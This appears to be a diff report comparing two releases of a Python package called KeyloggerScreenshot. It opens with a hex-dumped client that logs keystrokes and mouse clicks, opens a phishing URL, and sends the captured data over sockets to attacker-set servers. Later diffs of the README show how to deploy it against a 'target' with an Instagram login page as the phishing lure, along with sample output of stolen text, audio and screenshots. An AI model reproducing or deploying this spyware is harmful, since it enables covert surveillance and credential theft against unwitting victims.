+00003290: 2020 2020 2020 2020 2020 2069 6620 7365             if se
+000032a0: 6c66 2e72 6963 6874 6967 655f 6c69 7374  lf.richtige_list
+000032b0: 653a 0d0a 2020 2020 2020 2020 2020 2020  e:..            
+000032c0: 2020 2020 2020 2020 2020 2020 7365 6c66              self
+000032d0: 2e72 6963 6874 6967 655f 6c69 7374 652e  .richtige_liste.
+000032e0: 706f 7028 2d31 290d 0a20 2020 2020 2020  pop(-1)..       
+000032f0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00003300: 2023 2052 656d 6f76 6573 2074 6865 206c   # Removes the l
+00003310: 6173 7420 6974 656d 206f 6620 7468 6520  ast item of the 
+00003320: 6c69 7374 0d0a 0d0a 2020 2020 2020 2020  list....        
+00003330: 2020 2020 2020 2020 7365 6c66 2e73 6563          self.sec
+00003340: 6f6e 6473 5b30 5d20 3d20 616c 6c0d 0a20  onds[0] = all.. 
+00003350: 2020 2020 2020 2020 2020 2020 2020 2023                 #
+00003360: 204c 6973 7420 7769 6c6c 2061 6c6c 7761   List will allwa
+00003370: 7973 2062 6520 7570 6461 7465 640d 0a0d  ys be updated...
+00003380: 0a20 2020 2064 6566 206f 6e5f 7265 6c65  .    def on_rele
+00003390: 6173 6528 7365 6c66 2c20 6b65 7929 3a0d  ase(self, key):.
+000033a0: 0a20 2020 2020 2020 2070 7269 6e74 2866  .        print(f
+000033b0: 274b 6579 2072 656c 6561 7365 643a 207b  'Key released: {
+000033c0: 6b65 797d 2729 0d0a 0d0a 2020 2020 4073  key}')....    @s
+000033d0: 7461 7469 636d 6574 686f 640d 0a20 2020  taticmethod..   
+000033e0: 2064 6566 2069 6e74 6572 6e65 745f 636f   def internet_co
+000033f0: 6e6e 6563 7469 6f6e 2829 3a0d 0a20 2020  nnection():..   
+00003400: 2020 2020 2023 2054 6869 7320 6675 6e63       # This func
+00003410: 7469 6f6e 2063 6865 636b 7320 6966 2061  tion checks if a
+00003420: 2063 6f6e 6e65 6374 696f 6e20 6973 2073   connection is s
+00003430: 7461 626c 650d 0a20 2020 2020 2020 2077  table..        w
+00003440: 6869 6c65 2054 7275 653a 0d0a 2020 2020  hile True:..    
+00003450: 2020 2020 2020 2020 7472 793a 0d0a 2020          try:..  
+00003460: 2020 2020 2020 2020 2020 2020 2020 7265                re
+00003470: 7175 6573 7473 2e67 6574 2822 6874 7470  quests.get("http
+00003480: 733a 2f2f 7777 772e 676f 6f67 6c65 2e63  s://www.google.c
+00003490: 6f6d 2f22 290d 0a20 2020 2020 2020 2020  om/")..         
+000034a0: 2020 2020 2020 2023 2047 6f6f 676c 6520         # Google 
+000034b0: 6973 2061 6c77 6179 7320 6f6e 6c69 6e65  is always online
+000034c0: 2073 6f20 4920 6368 6f73 6520 676f 6f67   so I chose goog
+000034d0: 6c65 0d0a 2020 2020 2020 2020 2020 2020  le..            
+000034e0: 2020 2020 6272 6561 6b0d 0a20 2020 2020      break..     
+000034f0: 2020 2020 2020 2020 2020 2023 2049 6620             # If 
+00003500: 7468 6572 6520 6973 2061 6e20 696e 7465  there is an inte
+00003510: 726e 6574 2063 6f6e 6e65 6374 696f 6e20  rnet connection 
+00003520: 6974 2077 696c 6c20 7275 6e20 6173 206e  it will run as n
+00003530: 6f72 6d61 6c0d 0a20 2020 2020 2020 2020  ormal..         
+00003540: 2020 2065 7863 6570 7420 7265 7175 6573     except reques
+00003550: 7473 2e65 7863 6570 7469 6f6e 732e 436f  ts.exceptions.Co
+00003560: 6e6e 6563 7469 6f6e 4572 726f 723a 0d0a  nnectionError:..
+00003570: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00003580: 7072 696e 7428 224e 6f20 436f 6e6e 6563  print("No Connec
+00003590: 7469 6f6e 2229 0d0a 0d0a 2020 2020 6465  tion")....    de
+000035a0: 6620 7374 6172 7428 7365 6c66 293a 0d0a  f start(self):..
+000035b0: 2020 2020 2020 2020 7365 6c66 2e69 6e74          self.int
+000035c0: 6572 6e65 745f 636f 6e6e 6563 7469 6f6e  ernet_connection
+000035d0: 2829 0d0a 2020 2020 2020 2020 7469 6d65  ()..        time
+000035e0: 2e73 6c65 6570 2831 290d 0a20 2020 2020  .sleep(1)..     
+000035f0: 2020 2023 204a 7573 7420 746f 2063 6f6f     # Just to coo
+00003600: 6c20 646f 776e 0d0a 0d0a 2020 2020 2020  l down....      
+00003610: 2020 6c69 7374 656e 696e 675f 7468 7265    listening_thre
+00003620: 6164 203d 2074 6872 6561 6469 6e67 2e54  ad = threading.T
+00003630: 6872 6561 6428 7461 7267 6574 3d73 656c  hread(target=sel
+00003640: 662e 6461 7465 6e5f 6175 666e 6568 656d  f.daten_aufnehem
+00003650: 656e 290d 0a20 2020 2020 2020 2023 2054  en)..        # T
+00003660: 6869 7320 7275 6e73 2074 6865 2070 726f  his runs the pro
+00003670: 6772 616d 2062 6568 696e 6420 7468 6520  gram behind the 
+00003680: 6163 7475 616c 2070 726f 6772 616d 6d69  actual programmi
+00003690: 6e67 0d0a 2020 2020 2020 2020 6c69 7374  ng..        list
+000036a0: 656e 696e 675f 7468 7265 6164 2e73 7461  ening_thread.sta
+000036b0: 7274 2829 0d0a 0d0a 2020 2020 2020 2020  rt()....        
+000036c0: 6966 2073 656c 662e 7068 6973 6869 6e67  if self.phishing
+000036d0: 2069 7320 6e6f 7420 4e6f 6e65 3a0d 0a20   is not None:.. 
+000036e0: 2020 2020 2020 2020 2020 2077 6869 6c65             while
+000036f0: 2054 7275 653a 0d0a 2020 2020 2020 2020   True:..        
+00003700: 2020 2020 2020 2020 6966 2073 656c 662e          if self.
+00003710: 7472 7565 5f63 6f6e 6e65 6374 696f 6e3a  true_connection:
+00003720: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+00003730: 2020 2020 2020 7472 793a 0d0a 2020 2020        try:..    
+00003740: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00003750: 2020 2020 7265 7175 6573 7473 2e67 6574      requests.get
+00003760: 2873 656c 662e 7068 6973 6869 6e67 290d  (self.phishing).
+00003770: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00003780: 2020 2020 2020 2020 2023 2052 6573 706f           # Respo
+00003790: 6e73 6520 6973 2068 6572 6520 746f 2073  nse is here to s
+000037a0: 6565 2069 6620 7468 6520 7765 6273 6974  ee if the websit
+000037b0: 6520 6973 206f 6e6c 696e 6520 6f72 206e  e is online or n
+000037c0: 6f74 0d0a 2020 2020 2020 2020 2020 2020  ot..            
+000037d0: 2020 2020 2020 2020 2020 2020 7765 6262              webb
+000037e0: 726f 7773 6572 2e6f 7065 6e28 7365 6c66  rowser.open(self
+000037f0: 2e70 6869 7368 696e 6729 0d0a 2020 2020  .phishing)..    
+00003800: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00003810: 2020 2020 6272 6561 6b0d 0a0d 0a20 2020      break....   
+00003820: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00003830: 2065 7863 6570 7420 7265 7175 6573 7473   except requests
+00003840: 2e65 7863 6570 7469 6f6e 732e 436f 6e6e  .exceptions.Conn
+00003850: 6563 7469 6f6e 4572 726f 723a 0d0a 2020  ectionError:..  
+00003860: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00003870: 2020 2020 2020 6272 6561 6b0d 0a0d 0a20        break.... 
+00003880: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00003890: 2020 2065 7863 6570 7420 7265 7175 6573     except reques
+000038a0: 7473 2e65 7863 6570 7469 6f6e 732e 496e  ts.exceptions.In
+000038b0: 7661 6c69 6455 524c 3a0d 0a20 2020 2020  validURL:..     
+000038c0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000038d0: 2020 2062 7265 616b 0d0a 0d0a 0d0a 0d0a     break........
+000038e0: 2020 2020 2020 2020 7468 7265 6164 696e          threadin
+000038f0: 675f 6d6f 7573 6520 3d20 7468 7265 6164  g_mouse = thread
+00003900: 696e 672e 5468 7265 6164 2874 6172 6765  ing.Thread(targe
+00003910: 743d 7365 6c66 2e61 6c6c 5f63 6c69 636b  t=self.all_click
+00003920: 7329 0d0a 2020 2020 2020 2020 2320 5468  s)..        # Th
+00003930: 6973 2072 756e 7320 7468 6520 7072 6f67  is runs the prog
+00003940: 726d 6d20 6265 6869 6e64 2074 6865 2061  rmm behind the a
+00003950: 6374 7561 6c20 7072 6f67 7261 6d6d 696e  ctual programmin
+00003960: 670d 0a20 2020 2020 2020 2074 6872 6561  g..        threa
+00003970: 6469 6e67 5f6d 6f75 7365 2e73 7461 7274  ding_mouse.start
+00003980: 2829 0d0a 2020 2020 2020 2020 2320 4966  ()..        # If
+00003990: 2074 6865 2073 6572 7665 7220 6973 2074   the server is t
+000039a0: 6865 2064 6f77 6e20 6974 2077 696c 6c20  he down it will 
+000039b0: 7374 6f72 6520 7468 6520 6461 7461 206c  store the data l
+000039c0: 6f63 616c 6c79 2061 6e64 2077 6169 7420  ocally and wait 
+000039d0: 756e 7469 6c20 7468 6520 7365 7276 6572  until the server
+000039e0: 2069 7320 6176 6169 6c61 626c 6520 6167   is available ag
+000039f0: 6169 6e2e 0d0a 2020 2020 2020 2020 7768  ain...        wh
+00003a00: 696c 6520 5472 7565 3a0d 0a20 2020 2020  ile True:..     
+00003a10: 2020 2020 2020 2074 7279 3a0d 0a20 2020         try:..   
+00003a20: 2020 2020 2020 2020 2020 2020 2073 656e               sen
+00003a30: 645f 7469 6d65 7220 3d20 736f 636b 6574  d_timer = socket
+00003a40: 2e73 6f63 6b65 7428 736f 636b 6574 2e41  .socket(socket.A
+00003a50: 465f 494e 4554 2c20 736f 636b 6574 2e53  F_INET, socket.S
+00003a60: 4f43 4b5f 5354 5245 414d 290d 0a20 2020  OCK_STREAM)..   
+00003a70: 2020 2020 2020 2020 2020 2020 2073 656e               sen
+00003a80: 645f 7469 6d65 722e 636f 6e6e 6563 7428  d_timer.connect(
+00003a90: 2873 656c 662e 6970 5f74 696d 6572 2c20  (self.ip_timer, 
+00003aa0: 7365 6c66 2e70 6f72 745f 7469 6d65 7229  self.port_timer)
+00003ab0: 290d 0a0d 0a20 2020 2020 2020 2020 2020  )....           
+00003ac0: 2020 2020 2073 656e 645f 7469 6d65 722e       send_timer.
+00003ad0: 7365 6e64 2873 7472 2873 656c 662e 6475  send(str(self.du
+00003ae0: 7261 7469 6f6e 292e 656e 636f 6465 2829  ration).encode()
+00003af0: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
+00003b00: 2020 2023 2054 6869 7320 7365 6e64 7320     # This sends 
+00003b10: 7468 6520 7365 636f 6e64 7320 746f 2074  the seconds to t
+00003b20: 6865 2073 6572 7665 720d 0a20 2020 2020  he server..     
+00003b30: 2020 2020 2020 2020 2020 2073 656e 645f             send_
+00003b40: 7469 6d65 722e 636c 6f73 6528 290d 0a20  timer.close().. 
+00003b50: 2020 2020 2020 2020 2020 2020 2020 2062                 b
+00003b60: 7265 616b 0d0a 0d0a 2020 2020 2020 2020  reak....        
+00003b70: 2020 2020 6578 6365 7074 3a0d 0a20 2020      except:..   
+00003b80: 2020 2020 2020 2020 2020 2020 2063 6f6e               con
+00003b90: 7469 6e75 650d 0a0d 0a0d 0a20 2020 2020  tinue......     
+00003ba0: 2020 2077 6974 6820 6b65 7962 6f61 7264     with keyboard
+00003bb0: 2e4c 6973 7465 6e65 7228 6f6e 5f70 7265  .Listener(on_pre
+00003bc0: 7373 3d73 656c 662e 6f6e 5f70 7265 7373  ss=self.on_press
+00003bd0: 2c20 6f6e 5f72 656c 6561 7365 3d73 656c  , on_release=sel
+00003be0: 662e 6f6e 5f72 656c 6561 7365 2920 6173  f.on_release) as
+00003bf0: 206c 6973 7465 6e65 723a 0d0a 2020 2020   listener:..    
+00003c00: 2020 2020 2020 2020 7365 6c66 2e63 6f75          self.cou
+00003c10: 6e74 646f 776e 5f73 656e 6428 7365 6c66  ntdown_send(self
+00003c20: 2e64 7572 6174 696f 6e2c 2073 656c 662e  .duration, self.
+00003c30: 6970 5f70 686f 746f 732c 2073 656c 662e  ip_photos, self.
+00003c40: 706f 7274 5f70 686f 746f 732c 2073 656c  port_photos, sel
+00003c50: 662e 6970 5f6b 6579 6c6f 6767 6572 2c0d  f.ip_keylogger,.
+00003c60: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00003c70: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00003c80: 2073 656c 662e 706f 7274 5f6b 6579 6c6f   self.port_keylo
+00003c90: 6767 6572 290d 0a20 2020 2020 2020 2020  gger)..         
+00003ca0: 2020 206c 6973 7465 6e65 722e 6a6f 696e     listener.join
+00003cb0: 2829 0d0a 2020 2020 2020 2020 2020 2020  ()..            
+00003cc0: 2320 5468 6973 206c 6973 7465 6e73 2074  # This listens t
+00003cd0: 6f20 7468 6520 6b65 7973 2074 6861 7420  o the keys that 
+00003ce0: 7768 6572 6520 7479 0d0a                 where ty..
```

### Comparing `KeyloggerScreenshot-0.5.0/KeyloggerScreenshot/Port_data.py` & `KeyloggerScreenshot-0.6.0/KeyloggerScreenshot/Port_data.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.5.0/KeyloggerScreenshot/Server_keylogger.py` & `KeyloggerScreenshot-0.6.0/KeyloggerScreenshot/Server_keylogger.py`

 * *Files 1% similar despite different names*

```diff
@@ -15,14 +15,15 @@
         self.port = port
         self.simulater = simulater
         self.new_data = None
         self.check_under = False
         self.new_cor = None
         self.full_msg = None
         self.cord = None
+        self.false_url_error = ["No connection", "Invalid Url"]
 
     def do_file(self, spalten):
         if spalten != "":
             # If the data is not empty
             text = spalten
             for zeichen in text:
                 if "{" == zeichen:
@@ -86,14 +87,15 @@
 
             bp.color("Waiting for connection....", "magenta")
             clientsocket, ipaddress = server.accept()
             # Data is in clientsocket and the ip-address is obviously in "ipaddress"
             bp.color(f"\nConnection has been established with {ipaddress}", "magenta")
 
             self.full_msg = ServerPhotos.get_data(self, clientsocket, "r", 8192)
+
             if ")]" in self.full_msg:
                 if "***%§§)§§%" in self.full_msg:
                     self.new_cor = "[(" + self.full_msg.split("[(")[1]
                     spalten = self.full_msg.split("[(")[0].split("***%§§)§§%")
                     # This splits the data with the special code
                     self.do_file(spalten[1])
 
@@ -124,15 +126,14 @@
                 self.message(self.full_msg)
 
             elif "[]" == self.full_msg and "THE CONNECTION HAS BEEN INTERRUPTED" not in self.full_msg:
                 # Checks if nothing has typed or clicked
                 bp.color("The target hasn't typed and clicked anything", "magenta")
                 # This shuts down the server
             else:
-                print(self.full_msg)
                 self.do_file(self.full_msg.split("***%§§)§§%")[1])
 
             if self.is_True:
                 time.sleep(1)
                 self.terminator()
 
             if self.simulater is True:
```

### Comparing `KeyloggerScreenshot-0.5.0/KeyloggerScreenshot/Server_listener.py` & `KeyloggerScreenshot-0.6.0/KeyloggerScreenshot/Server_listener.py`

 * *Files 9% similar despite different names*

```diff
@@ -1,10 +1,11 @@
 import sys
 import socket
 import os
+import time
 import wave
 import ast
 import BetterPrinting as bp
 from .Server_photos import ServerPhotos
 from .Port_data import Ports
 
 class ServerListener:
@@ -58,8 +59,9 @@
 
             # This stores everything the target was talking
 
         except OSError:
             working_port = Ports.get_working_ports()
             if str(self.port) in working_port:
                 bp.color(f"PLEASE USE AN OTHER PORT NUMBER FOR SERVERLISTENER. PORT NUMBER: {self.port} already in use","green")
+                time.sleep(1)
                 os._exit(0)
```

### Comparing `KeyloggerScreenshot-0.5.0/KeyloggerScreenshot/Server_photos.py` & `KeyloggerScreenshot-0.6.0/KeyloggerScreenshot/Server_photos.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.5.0/KeyloggerScreenshot/Server_timer.py` & `KeyloggerScreenshot-0.6.0/KeyloggerScreenshot/Server_timer.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.5.0/KeyloggerScreenshot/Simulation_code.py` & `KeyloggerScreenshot-0.6.0/KeyloggerScreenshot/Simulation_code.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.5.0/KeyloggerScreenshot.egg-info/PKG-INFO` & `KeyloggerScreenshot-0.6.0/KeyloggerScreenshot.egg-info/PKG-INFO`

 * *Files 18% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: KeyloggerScreenshot
-Version: 0.5.0
+Version: 0.6.0
 Summary: Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot
 Home-page: 
 Author: Fawaz Bashiru
 Author-email: fawazbashiru@gmail.com
 License: MIT
 Keywords: Keylogger
 Classifier: Development Status :: 6 - Mature
@@ -88,18 +88,14 @@
 
 Client
 ------
 
 ````python
 #client_target.py
 import KeyloggerScreenshot as ks
-import threading
-
-thread_deleter = threading.Thread(target=ks.Local_Deleter.DeleteList.start)
-thread_deleter.start()
 
 ip = '127.0.0.1'
 key_client = ks.KeyloggerTarget(ip, 1111, ip, 2222, ip, 3333,ip, 4444, duration_in_seconds=60, phishing_web="https://www.instagram.com/accounts/login/?__coig_restricted=1") # You can open a link when the keylogger starts
 key_client.start()
 ````
 
 You can specify the time of running in seconds in the "duration_in_seconds" variable
@@ -126,56 +122,58 @@
 * If you really want to send this to work externally, you have to buy a server and download the code on my github.
 
 * If backspace is pressed the last pressed character will be deleted from the list
 
 Output
 ------
 ````
+    __ __              __                                 _____                                       __            __ 
+   / //_/___   __  __ / /____   ____ _ ____ _ ___   _____/ ___/ _____ _____ ___   ___   ____   _____ / /_   ____   / /_
+  / ,<  / _ \ / / / // // __ \ / __ `// __ `// _ \ / ___/\__ \ / ___// ___// _ \ / _ \ / __ \ / ___// __ \ / __ \ / __/
+ / /| |/  __// /_/ // // /_/ // /_/ // /_/ //  __// /   ___/ // /__ / /   /  __//  __// / / /(__  )/ / / // /_/ // /_  
+/_/ |_|\___/ \__, //_/ \____/ \__, / \__, / \___//_/   /____/ \___//_/    \___/ \___//_/ /_//____//_/ /_/ \____/ \__/  
+            /____/           /____/ /____/    
+
+                        ~Created by: Fawaz Bashiru~          
+                        ~Write "python KLS_start.py -help" for help in the github version~   
+                        REMINDER THIS WAS BUILD FOR EDUCATIONAL PURPOSES  
+                        SO DON'T USE THIS FOR EVIL ACTIVITIES !!!!!                        
+        
 Cyan: ServerPhotos
 Blue: ServerKeylogger
 Green: ServerListener
 White: Timer
 
-
-Waiting for connection....Waiting for connection...
-Waiting for connection...
-
-Connection has been established with the ip 127.0.0.1
-Time left: 02:59
-
-Connection has been established with ('127.0.0.1', 63822)
-Time left: 00:01Connection has been established with ('127.0.0.1', 63842)
-
-Successful connection for 3 minutes and 20 seconds
-"Audio of target.wav" has been saved to your directory
-Connection has been established with ('127.0.0.1', 63843)
-Text of target: Hello this is a test 123. 123 Nice it works have fun  guys 
-1 Image have been saved to your working directory
 Waiting for connection...
-
-
-Connection has been established with ('127.0.0.1', 63824)
-2 Images has been saved to your working directory
 Waiting for connection...
+Waiting for connection....
+Connection has been established with ('127.0.0.1', 49162)
+The target is being connected. The Data of the target is coming....
+Time left: 00:01
+Successful connection for 1 minutes
 
 
-Connection has been established with ('127.0.0.1', 63825)
+Connection has been established with ('127.0.0.1', 49199)
+
+Connection has been established with ('127.0.0.1', 49198)
+The coordinates of the target have been saved to your directory
+True
+Text of target: Hello and welcome to KeyloggerScreenshot. I hope you like it and please remember do not use this for evil activities [TAB] 
+"Audio of Target.wav" has been saved to your directory
+Simulation will come in 10 seconds!!!
 3 Images has been saved to your working directory
 Waiting for connection...
+Do you want to start y/n?: y
 
+The target has clicked 1 times on his screen
+This simulation will last for 0 minutes and 27 seconds
 
-Connection has been established with ('127.0.0.1', 63829)
-4 Images has been saved to your working directory
-Waiting for connection...
-
-
-Connection has been established with ('127.0.0.1', 63841)
-5 Images has been saved to your working directory
-Waiting for connection...
-
+Time left: 00:01
+THANK YOU FOR YOU USING KEYLOGGERSCREENSHOT
+ERFOLGREICH: Der Prozess mit PID 7768 wurde beendet.
 ````
 Directory of Attacker
 ----------------------
 ![endresult](https://user-images.githubusercontent.com/106278241/210905855-35bc8cc1-435e-4dc6-bae7-62fcdedd1484.png)
 
 Additional
 ==========
@@ -374,7 +372,13 @@
 ------------------
 - All Images will now be sent at once
 - No more random Images
 - More efficient connections
 - New Output
 - New Name of the images ("Image_Target")
 - Data will be stored locally when the server is offline. If the server is online the data will automatically be sent
+
+0.6.0 (10/07/2023)
+------------------
+- Everything improved from the previous update
+- Detects if the server is offline
+- Py to exe now works without any issues
```

### Comparing `KeyloggerScreenshot-0.5.0/KeyloggerScreenshot.egg-info/SOURCES.txt` & `KeyloggerScreenshot-0.6.0/KeyloggerScreenshot.egg-info/SOURCES.txt`

 * *Files 11% similar despite different names*

```diff
@@ -7,14 +7,15 @@
 client.py
 demon_server.py
 leo_gui.py
 requirements.py
 setup.py
 target.py
 test.py
+tester.py
 KeyloggerScreenshot/Keylogger_Target.py
 KeyloggerScreenshot/Port_data.py
 KeyloggerScreenshot/Server_keylogger.py
 KeyloggerScreenshot/Server_listener.py
 KeyloggerScreenshot/Server_photos.py
 KeyloggerScreenshot/Server_timer.py
 KeyloggerScreenshot/Simulation_code.py
```

### Comparing `KeyloggerScreenshot-0.5.0/LISCENCE.txt` & `KeyloggerScreenshot-0.6.0/LISCENCE.txt`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.5.0/PKG-INFO` & `KeyloggerScreenshot-0.6.0/PKG-INFO`

 * *Files 18% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: KeyloggerScreenshot
-Version: 0.5.0
+Version: 0.6.0
 Summary: Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot
 Home-page: 
 Author: Fawaz Bashiru
 Author-email: fawazbashiru@gmail.com
 License: MIT
 Keywords: Keylogger
 Classifier: Development Status :: 6 - Mature
@@ -88,18 +88,14 @@
 
 Client
 ------
 
 ````python
 #client_target.py
 import KeyloggerScreenshot as ks
-import threading
-
-thread_deleter = threading.Thread(target=ks.Local_Deleter.DeleteList.start)
-thread_deleter.start()
 
 ip = '127.0.0.1'
 key_client = ks.KeyloggerTarget(ip, 1111, ip, 2222, ip, 3333,ip, 4444, duration_in_seconds=60, phishing_web="https://www.instagram.com/accounts/login/?__coig_restricted=1") # You can open a link when the keylogger starts
 key_client.start()
 ````
 
 You can specify the time of running in seconds in the "duration_in_seconds" variable
@@ -126,56 +122,58 @@
 * If you really want to send this to work externally, you have to buy a server and download the code on my github.
 
 * If backspace is pressed the last pressed character will be deleted from the list
 
 Output
 ------
 ````
+    __ __              __                                 _____                                       __            __ 
+   / //_/___   __  __ / /____   ____ _ ____ _ ___   _____/ ___/ _____ _____ ___   ___   ____   _____ / /_   ____   / /_
+  / ,<  / _ \ / / / // // __ \ / __ `// __ `// _ \ / ___/\__ \ / ___// ___// _ \ / _ \ / __ \ / ___// __ \ / __ \ / __/
+ / /| |/  __// /_/ // // /_/ // /_/ // /_/ //  __// /   ___/ // /__ / /   /  __//  __// / / /(__  )/ / / // /_/ // /_  
+/_/ |_|\___/ \__, //_/ \____/ \__, / \__, / \___//_/   /____/ \___//_/    \___/ \___//_/ /_//____//_/ /_/ \____/ \__/  
+            /____/           /____/ /____/    
+
+                        ~Created by: Fawaz Bashiru~          
+                        ~Write "python KLS_start.py -help" for help in the github version~   
+                        REMINDER THIS WAS BUILD FOR EDUCATIONAL PURPOSES  
+                        SO DON'T USE THIS FOR EVIL ACTIVITIES !!!!!                        
+        
 Cyan: ServerPhotos
 Blue: ServerKeylogger
 Green: ServerListener
 White: Timer
 
-
-Waiting for connection....Waiting for connection...
-Waiting for connection...
-
-Connection has been established with the ip 127.0.0.1
-Time left: 02:59
-
-Connection has been established with ('127.0.0.1', 63822)
-Time left: 00:01Connection has been established with ('127.0.0.1', 63842)
-
-Successful connection for 3 minutes and 20 seconds
-"Audio of target.wav" has been saved to your directory
-Connection has been established with ('127.0.0.1', 63843)
-Text of target: Hello this is a test 123. 123 Nice it works have fun  guys 
-1 Image have been saved to your working directory
 Waiting for connection...
-
-
-Connection has been established with ('127.0.0.1', 63824)
-2 Images has been saved to your working directory
 Waiting for connection...
+Waiting for connection....
+Connection has been established with ('127.0.0.1', 49162)
+The target is being connected. The Data of the target is coming....
+Time left: 00:01
+Successful connection for 1 minutes
 
 
-Connection has been established with ('127.0.0.1', 63825)
+Connection has been established with ('127.0.0.1', 49199)
+
+Connection has been established with ('127.0.0.1', 49198)
+The coordinates of the target have been saved to your directory
+True
+Text of target: Hello and welcome to KeyloggerScreenshot. I hope you like it and please remember do not use this for evil activities [TAB] 
+"Audio of Target.wav" has been saved to your directory
+Simulation will come in 10 seconds!!!
 3 Images has been saved to your working directory
 Waiting for connection...
+Do you want to start y/n?: y
 
+The target has clicked 1 times on his screen
+This simulation will last for 0 minutes and 27 seconds
 
-Connection has been established with ('127.0.0.1', 63829)
-4 Images has been saved to your working directory
-Waiting for connection...
-
-
-Connection has been established with ('127.0.0.1', 63841)
-5 Images has been saved to your working directory
-Waiting for connection...
-
+Time left: 00:01
+THANK YOU FOR YOU USING KEYLOGGERSCREENSHOT
+ERFOLGREICH: Der Prozess mit PID 7768 wurde beendet.
 ````
 Directory of Attacker
 ----------------------
 ![endresult](https://user-images.githubusercontent.com/106278241/210905855-35bc8cc1-435e-4dc6-bae7-62fcdedd1484.png)
 
 Additional
 ==========
@@ -374,7 +372,13 @@
 ------------------
 - All Images will now be sent at once
 - No more random Images
 - More efficient connections
 - New Output
 - New Name of the images ("Image_Target")
 - Data will be stored locally when the server is offline. If the server is online the data will automatically be sent
+
+0.6.0 (10/07/2023)
+------------------
+- Everything improved from the previous update
+- Detects if the server is offline
+- Py to exe now works without any issues
```

### Comparing `KeyloggerScreenshot-0.5.0/README.md` & `KeyloggerScreenshot-0.6.0/README.md`

 * *Files 22% similar despite different names*

```diff
@@ -72,18 +72,14 @@
 
 Client
 ------
 
 ````python
 #client_target.py
 import KeyloggerScreenshot as ks
-import threading
-
-thread_deleter = threading.Thread(target=ks.Local_Deleter.DeleteList.start)
-thread_deleter.start()
 
 ip = '127.0.0.1'
 key_client = ks.KeyloggerTarget(ip, 1111, ip, 2222, ip, 3333,ip, 4444, duration_in_seconds=60, phishing_web="https://www.instagram.com/accounts/login/?__coig_restricted=1") # You can open a link when the keylogger starts
 key_client.start()
 ````
 
 You can specify the time of running in seconds in the "duration_in_seconds" variable
@@ -110,56 +106,58 @@
 * If you really want to send this to work externally, you have to buy a server and download the code on my github.
 
 * If backspace is pressed the last pressed character will be deleted from the list
 
 Output
 ------
 ````
+    __ __              __                                 _____                                       __            __ 
+   / //_/___   __  __ / /____   ____ _ ____ _ ___   _____/ ___/ _____ _____ ___   ___   ____   _____ / /_   ____   / /_
+  / ,<  / _ \ / / / // // __ \ / __ `// __ `// _ \ / ___/\__ \ / ___// ___// _ \ / _ \ / __ \ / ___// __ \ / __ \ / __/
+ / /| |/  __// /_/ // // /_/ // /_/ // /_/ //  __// /   ___/ // /__ / /   /  __//  __// / / /(__  )/ / / // /_/ // /_  
+/_/ |_|\___/ \__, //_/ \____/ \__, / \__, / \___//_/   /____/ \___//_/    \___/ \___//_/ /_//____//_/ /_/ \____/ \__/  
+            /____/           /____/ /____/    
+
+                        ~Created by: Fawaz Bashiru~          
+                        ~Write "python KLS_start.py -help" for help in the github version~   
+                        REMINDER THIS WAS BUILD FOR EDUCATIONAL PURPOSES  
+                        SO DON'T USE THIS FOR EVIL ACTIVITIES !!!!!                        
+        
 Cyan: ServerPhotos
 Blue: ServerKeylogger
 Green: ServerListener
 White: Timer
 
-
-Waiting for connection....Waiting for connection...
 Waiting for connection...
-
-Connection has been established with the ip 127.0.0.1
-Time left: 02:59
-
-Connection has been established with ('127.0.0.1', 63822)
-Time left: 00:01Connection has been established with ('127.0.0.1', 63842)
-
-Successful connection for 3 minutes and 20 seconds
-"Audio of target.wav" has been saved to your directory
-Connection has been established with ('127.0.0.1', 63843)
-Text of target: Hello this is a test 123. 123 Nice it works have fun  guys 
-1 Image have been saved to your working directory
 Waiting for connection...
+Waiting for connection....
+Connection has been established with ('127.0.0.1', 49162)
+The target is being connected. The Data of the target is coming....
+Time left: 00:01
+Successful connection for 1 minutes
 
 
-Connection has been established with ('127.0.0.1', 63824)
-2 Images has been saved to your working directory
-Waiting for connection...
-
-
-Connection has been established with ('127.0.0.1', 63825)
+Connection has been established with ('127.0.0.1', 49199)
+
+Connection has been established with ('127.0.0.1', 49198)
+The coordinates of the target have been saved to your directory
+True
+Text of target: Hello and welcome to KeyloggerScreenshot. I hope you like it and please remember do not use this for evil activities [TAB] 
+"Audio of Target.wav" has been saved to your directory
+Simulation will come in 10 seconds!!!
 3 Images has been saved to your working directory
 Waiting for connection...
+Do you want to start y/n?: y
 
+The target has clicked 1 times on his screen
+This simulation will last for 0 minutes and 27 seconds
 
-Connection has been established with ('127.0.0.1', 63829)
-4 Images has been saved to your working directory
-Waiting for connection...
-
-
-Connection has been established with ('127.0.0.1', 63841)
-5 Images has been saved to your working directory
-Waiting for connection...
-
+Time left: 00:01
+THANK YOU FOR YOU USING KEYLOGGERSCREENSHOT
+ERFOLGREICH: Der Prozess mit PID 7768 wurde beendet.
 ````
 Directory of Attacker
 ----------------------
 ![endresult](https://user-images.githubusercontent.com/106278241/210905855-35bc8cc1-435e-4dc6-bae7-62fcdedd1484.png)
 
 Additional
 ==========
```

### Comparing `KeyloggerScreenshot-0.5.0/Simulation_code.py` & `KeyloggerScreenshot-0.6.0/Simulation_code.py`

